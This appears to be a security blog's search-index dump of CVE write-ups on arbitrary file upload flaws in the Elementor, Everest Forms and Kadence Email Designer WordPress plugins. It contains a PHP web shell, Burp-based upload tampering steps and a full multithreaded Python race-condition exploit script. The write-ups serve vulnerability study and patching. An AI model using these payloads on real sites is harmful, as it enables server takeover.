--\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\r","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a JSON file containing a web shell PHP \u003c?php system($_REQUEST[\"cmd\"])?\u003e Upload and intercept the request using BurpSuite Change the file extension to PHP combined with path traversal and send the request Request with path traversal and .php\rResult RCE via file upload\r","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2023-48777 vulnerability allows users with Contributor privileges to upload malicious files due to the lack of file type validation before saving. This can lead to Arbitrary File Upload and Remote Code Execution (RCE) if the server allows execution of uploaded files. The issue was patched in version 3.18.2 by adding a check for allowed file extensions before writing to disk. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rAlways validate file type before saving. Do not trust Base64 data or file names from the client. Restrict upload permissions and separate upload storage from executable locations. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin \u003c= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Everest Forms – Contact Forms, Quiz, Survey, Newsletter \u0026 Payment Form Builder plugin for WordPress is vulnerable to arbitrary file upload, read, and deletion due to missing file type and path validation in the format method of the EVF_Form_Fields_Upload class in all versions up to and including 3.0.9.4. This allows unauthenticated attackers to upload, read, and delete arbitrary files on the affected site’s server, potentially leading to remote code execution, sensitive information disclosure, or site takeover. CVE ID: CVE-2025-1128 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.0.9.4 Patched Versions: 3.0.9.5 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.0.9.4 – vulnerable 3.0.9.5 – patched Diff Tool (diff) → Meld or any diff tool of your choice. ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThis vulnerability is caused by insufficient validation of file types and file paths in the format method of the EVF_Form_Fields_Upload class. Even when a file is of an invalid type, the upload flow can continue; by modifying parts of the submitted data/communication, server-side validation can be bypassed. public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } ... // upload file handler } The wp_check_filetype_and_ext() function will return empty values for $ext and $type if the uploaded file is invalid (not in WordPress’s whitelist of allowed types: https://developer.wordpress.org/reference/functions/wp_get_mime_types/). After lines 8-9 run, there is no mechanism to stop execution, so the upload logic continues. The patch fixes this by calling wp_die(): public function format( $field_id, $field_submit, $form_data, $meta_key ) { ... $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); wp_die( 'File type is not allowed' ); } ... // upload file handler } ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rpublic function format( $field_id, $field_submit, $form_data, $meta_key ) { // Setup class properties to reuse everywhere. $this-\u003eform_data = (array) $form_data; $this-\u003eform_id = absint( $this-\u003eform_data['id'] ); $this-\u003efield_id = $field_id; $this-\u003efield_data = $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]; $field_label = ! empty( $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] ) ? $this-\u003eform_data['form_fields'][ $this-\u003efield_id ]['label'] : ''; $input_name = sprintf( 'everest_forms_%d_%s', $this-\u003eform_id, $this-\u003efield_id ); // Make sure json_decode() doesn't fail on newer PHP. try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } // Make sure we process only submitted files with the expected structure and keys. $files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); if ( empty( $files ) ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $data = array(); foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $file['tmp_path'], $file['name'] ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; if ( $proper_filename || ! $ext || ! $type ) { evf()-\u003etask-\u003eerrors[ $form_data['id'] ][ $field_id ] = esc_html__( 'File type is not allowed.', 'everest-forms' ); update_option( 'evf_validation_error', 'yes' ); } // Allow third-party integrations. if ( has_filter( 'everest_forms_integration_uploads' ) ) { $file = apply_filters( 'everest_forms_integration_uploads', $file, $this-\u003eform_data ); } if ( $this-\u003eis_media_integrated() ) { $file['path'] = $file['tmp_path']; $file = $this-\u003egenerate_file_attachment( $file ); } elseif ( ! isset( $file['external'] ) \u0026\u0026 file_exists( $file['tmp_path'] ) ) { $this-\u003ecreate_dir( dirname( $file['path'] ) ); @rename( $file['tmp_path'] , $file['path'] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged $this-\u003eset_file_fs_permissions( $file['path'] ); } $data[] = $this-\u003egenerate_file_data( $file ); } ... } This plugin is intended to create form templates and use them in posts/pages. Because the vulnerability concerns file upload, we create a form with a File Upload field and embed it into a post. Create a form with a **File Upload** field\rUpload any file and intercept it with BurpSuite (uploads are allowed for anonymous users when accessing the post/page that contains the form). Intercept file upload request with BurpSuite\rSet a breakpoint at the format() method and observe. $input_name in debugger\rFrom debugging, $input_name maps to the array containing JSON data fields file and name. The data is JSON-decoded and assigned to $raw_files: try { $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security } catch ( Exception $e ) { evf()-\u003etask-\u003eform_fields[ $this-\u003efield_id ] = $processed; return; } $raw_files in debugger\r$files = array_filter( $raw_files, static function ( $file ) { return ( is_array( $file ) || is_object( $file ) \u0026\u0026 count( $file ) === 2 ) \u0026\u0026 ! empty( $file['file'] ) \u0026\u0026 ! empty( $file['name'] ); } ); This filter returns the data assigned to $files, ensuring only submitted files with the expected structure and keys are processed; otherwise it returns empty. $files in debugger\rIterating the $files array, the plugin calls generate_file_info() to create temporary information for each file, then checks the file type using wp_check_filetype_and_ext(). foreach ( $files as $file ) { $file = $this-\u003egenerate_file_info( $file ); $wp_filetype = wp_check_filetype_and_ext( $fi","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\rgraph TD\rA[\"User submits form (file)\"] --\u003e B[\"Browser sends POST to page with form\"]\rB --\u003e C[\"WP hook triggered - listen_task()\"]\rC --\u003e D[\"do_task() calls do_action() with field type\"]\rD --\u003e E[\"everest_forms_process_format_file-upload calls format()\"]\rE --\u003e F[\"generate_file_info() creates tmp_path, name, path\"]\rE --\u003e G[\"wp_check_filetype_and_ext(tmp_path, name)\"]\rG --\u003e H{\"File type check result\"}\rH --\u003e|Valid| I[\"rename(tmp_path → path) moves file to uploads\"]\rH --\u003e|Invalid| J[\"Set error but continue execution\"]\rJ --\u003e I\rI --\u003e K[\"File accessible in uploads → potential executable upload\"]\r","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a .txt file that contains PHP code: TEXT \u003c?php phpinfo();?\u003e Enable Burp Intercept and capture the file upload request. Modify the name field in the intercepted request to use the .php extension and forward the request. File uploaded successfully\rAccess the uploaded file. phpinfo() from uploaded file\r","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability in EVF_Form_Fields_Upload::format() allows arbitrary file upload, read, and deletion due to improper file type and path validation. Although the plugin logs an error when encountering an invalid file, the execution flow does not halt and still calls rename() to move the file into a public directory — enabling the placement of executable code on the server (RCE), disclosure of sensitive data, or site takeover. The patch (\u003e= 3.0.9.5) fixes this by stopping execution when an invalid file is detected; unpatched sites remain at high risk. ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rInsufficient validation of file types/extensions can lead to executable file uploads. Detecting an invalid file but not stopping the execution flow allows attackers to bypass checks. Validation is meaningless unless accompanied by a blocking action (stop/exit/wp_die) prior to filesystem operations. Validate file content (MIME/content) in addition to name/extension provided by the client. Prevent PHP execution in the uploads directory and use safe upload APIs (e.g., wp_handle_upload()). ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Everest Forms Plugin \u003c= 3.0.9.4 is vulnerable to Arbitrary File Upload ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Kadence WooCommerce Email Designer Plugin.","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rAn Arbitrary File Upload vulnerability in Ben Ritner - Kadence WP Kadence WooCommerce Email Designer allows uploading a web shell to the web server. This issue affects Kadence WooCommerce Email Designer from an unspecified version up to 1.5.14. CVE ID: CVE-2025-39557 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.5.14 Patched Versions: 1.5.15 CVSS severity: Low (9.1) Required Privilege: Administrator Product: WordPress Kadence WooCommerce Email Designer Plugin ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Kadence WooCommerce Email Designer: 1.5.14 (vulnerable) and 1.5.15 (patched). Diff tool - Meld or any diff tool to compare versions. WooCommerce Plugin ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rstatic private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } In the vulnerable version, the import_woomail() function calls wp_handle_upload() to upload files to WordPress’s uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug\rHowever, the option test_type =\u003e false causes WordPress to skip MIME type checking against the whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. static private function import_woomail( $wp_customize ) { ... $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e true, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); ... } The patch changes 'test_type' =\u003e true, enabling MIME checks against the whitelist and preventing dangerous uploads like .php web shells. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rstatic private function import_woomail( $wp_customize ) { // Make sure we have a valid nonce. if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } // Make sure WordPress upload support is loaded. if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } // Load the export/import option class. require_once KT_WOOMAIL_PATH . 'includes/class-kadence-woomail-import-option.php'; // Setup global vars. global $wp_customize; global $kt_woomail_import_error; // Setup internal vars. $kt_woomail_import_error = false; $template = 'kadence-woomail-designer'; $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); // Make sure we have an uploaded file. if ( isset( $file['error'] ) ) { $kt_woomail_import_error = $file['error']; return; } if ( ! file_exists( $file['file'] ) ) { $kt_woomail_import_error = __( 'Error importing settings! Please try again.', 'kadence-woocommerce-email-designer' ); return; } // Get the upload data. $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); // Check for support of older export files. Will remove later. if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } // Remove the uploaded file. unlink( $file['file'] ); ... exit; } The import_woomail() function handles uploads and imports for the Kadence WooCommerce Email Designer plugin: Verify nonce to ensure request validity (prevent CSRF): if ( ! wp_verify_nonce( $_REQUEST['kt-woomail-import'], 'kt-woomail-importing' ) ) { return; } Perform the upload via wp_handle_upload(): $overrides = array( 'test_form' =\u003e false, 'test_type' =\u003e false, 'mimes' =\u003e array( 'dat' =\u003e 'text/plain', 'json' =\u003e 'text/plain' ) ); $file = wp_handle_upload( $_FILES['kadence-woomail-import-file'], $overrides ); As analyzed above, this implementation accepts .php due to disabled MIME checks. Read uploaded file content and attempt to parse as JSON: $raw = file_get_contents( $file['file'] ); $data = json_decode( $raw, true ); If not valid JSON → attempt base64_decode() then unserialize(): if ( ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) \u0026\u0026 version_compare( phpversion(), '7.0.0' ) \u003e= 0 ) { $data = @unserialize( base64_decode( $raw ), array( 'allowed_classes' =\u003e false ) ); if ( 'array' != gettype( $data ) || ! isset( $data['template'] ) ) { $data = self::mb_unserialize( $raw ); } } Delete the uploaded file from the server: unlink( $file['file'] ); We need to pay attention to the following: graph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rgraph LR;\rA[Upload File] --\u003e B[Read File \u0026 Decode JSON]\rB --\u003e C{IF JSON}\rC --\u003e|True| D[\"unserialize()\"]\rD --\u003e E[\"unlink()\"]\rThe file is removed immediately after upload, so it cannot be accessed normally. Leverage the time window between Upload File and unlink() to call the uploaded file within that period to execute a web shell. This uses a File Upload + Race Condition technique. static public function import_export_requests( $wp_customize ) { // Check if user is allowed to change values. if ( ! Kadence_Woomail_Designer::is_admin() ) { exit; } if ( isset( $_REQUEST['kt-woomail-export'] ) ) { self::export_woomail( $wp_customize ); } if ( isset( $_REQUEST['kt-woomail-import'] ) \u0026\u0026 iss","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\rgraph TD\rA[\"Upload file via HTTP POST (kt-woomail-import + kadence-woomail-import-file)\"] --\u003e B[\"wp_handle_upload($_FILES['kadence-woomail-import-file'], $overrides) called\"]\rB --\u003e C[\"File written to /wp-content/uploads/year/month/filename\"]\rC --\u003e D[\"file_exists($file['file']) → file_get_contents($file['file'])\"]\rD --\u003e E[\"json_decode($raw) — attempt parse as JSON\"]\rE --\u003e F[\"If JSON invalid → base64_decode($raw) → unserialize()/mb_unserialize()\"]\rF --\u003e G[\"Process/import template data\"]\rG --\u003e H[\"unlink($file['file']) — delete uploaded file\"]\rH --\u003e I[\"File removed from filesystem\"]\r","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a script that runs parallel upload and checks import requests from concurrent.futures import ThreadPoolExecutor from datetime import datetime import threading proxies = { \"http\": \"127.0.0.1:8080\", \"https\": \"127.0.0.1:8080\" } headers = { \"User-Agent\": \"curl/8.14.1\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Cookie\": ( \"wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; \" \"wordpress_test_cookie=WP%20Cookie%20check; \" \"wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; \" \"mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D\" ) } php_payload = '\u003c?php phpinfo(); ?\u003e' upload_url = \"http://localhost/wp-admin/customize.php?kt-woomail-customize=1\" check_url = \"http://localhost/wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/\u003cfilename\u003e.php\" UPLOAD_THREADS = 40 CHECK_THREADS = 40 upload_success_detected = threading.Event() def upload_worker(_): session = requests.Session() session.headers.update(headers) session.verify = False files = { 'kt-woomail-import': (None, '5afa8d8781'), 'kadence-woomail-import-file': ('\u003cfilename\u003e.php', php_payload, 'application/octet-stream') } while not upload_success_detected.is_set(): try: response = session.post( upload_url, files=files, timeout=10 ) ts = datetime.now().strftime(\"%H:%M:%S\") if 200 \u003c= response.status_code \u003c 300: print(f\"\\033[92m[{ts}] [UPLOAD] Sent | 200 OK\\033[0m\") else: print(f\"\\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\\033[0m\") except Exception as e: print(f\"\\033[91m[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD ERROR] {e}\\033[0m\") def check_worker(_): session = requests.Session() session.proxies.update(proxies) session.verify = False while not upload_success_detected.is_set(): try: response = session.get(check_url, timeout=8) ts = datetime.now().strftime(\"%H:%M:%S\") if response.status_code == 200 and len(response.text) \u003e 0: print(f\"\\n\\033[101m[{ts}] [RCE DETECTED!] File uploaded \u0026 executed!\\033[0m\") upload_success_detected.set() break else: print(f\"[{ts}] [CHECK] {response.status_code} | Not found yet...\") except Exception as e: print(f\"[{datetime.now().strftime('%H:%M:%S')}] [CHECK ERROR] {e}\") if __name__ == \"__main__\": print(\"\\033[96m\" + \"=\"*60) print(\" WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT\") print(\" Upload + Auto Check Parallel Threads\") print(\"=\"*60 + \"\\033[0m\") print(f\"[*] Upload URL : {upload_url}\") print(f\"[*] Check URL : {check_url}\") print(f\"[*] Threads : {UPLOAD_THREADS} (upload) + {CHECK_THREADS} (check)\") print(\"[*] Press Ctrl+C to stop\\n\") try: with ThreadPoolExecutor(max_workers=UPLOAD_THREADS + CHECK_THREADS) as executor: upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)] check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)] upload_success_detected.wait() except KeyboardInterrupt: print(\"\\n\\033[93m[!] Stopped by user.\\033[0m\") finally: upload_success_detected.set() print(\"\\033[91m[!] All threads terminated.\\033[0m\") Specifically: The script performs concurrent upload and checks; it stops only when the check returns (status=200). The check function goes through a BurpSuite proxy to observe responses and filter by status code. Add cookies and nonce to the script Open BurpSuite to monitor requests/responses from the script. Run the script python3 -m venv venv source venv/bin/active pip install requests python script.py Terminal Output: Result on terminal\rBurpSuite Output: Result on BurpSuite\r","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:4:1","tags":["analyst","plugin","arbitrary file 